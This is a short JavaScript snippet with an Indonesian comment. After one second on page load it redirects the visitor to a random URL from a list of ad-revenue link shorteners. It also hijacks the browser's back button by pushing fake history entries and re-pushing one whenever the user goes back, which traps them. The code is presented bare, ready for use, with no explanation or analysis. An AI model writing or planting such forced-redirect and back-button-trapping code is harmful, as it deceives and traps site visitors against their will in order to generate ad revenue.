// 3 ke 4//
var urls = ["https://besargaji.com/GFpZhO",
              "https://link.bicolink.net/YJgKvrfFIR",
              "https://arahlink.id/6uD1NdX",
              "https://ouo.io/dVD7vS",
              "https://adbull.me/QyPqdO0c",
              "https://to.aoutoqw.xyz/Tbg1c",
              "https://go.aoutoqw.xyz/t2Qe4"];

  function redirect() {
    var randomIndex = Math.floor(Math.random() * urls.length);
    window.location.replace(urls[randomIndex]);
  }

  if (typeof history.pushState === "function") {
    history.pushState("jibberish", null, null);
    window.addEventListener("popstate", function() {
      history.pushState('newjibberish', null, null);
    });
  }

  window.onload = function() {
    setTimeout(function() {
      redirect();
    }, 1000);
  };
